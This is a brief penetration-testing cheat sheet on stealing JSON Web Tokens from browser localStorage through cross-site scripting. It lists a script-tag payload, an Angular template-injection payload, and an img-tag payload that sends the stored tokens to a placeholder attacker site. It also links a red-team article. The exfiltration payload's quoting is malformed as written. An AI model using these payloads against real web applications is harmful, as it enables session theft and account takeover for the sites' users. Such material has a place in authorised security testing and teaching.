# XSS and JWT

## JWT in localstorage

```text
<script>alert(JSON.stringify(localStorage))</script>
```

#### Stealing the cookie remotely

```text
<img src=’https://Attacker_site/gimme?jwt=’+JSON.stringify(localStorage);’--!>
```

### In Angular

```text
 {{constructor.constructor('alert(JSON.stringify(localStorage))')()}}
```

### Resource

{% embed url="https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0" %}





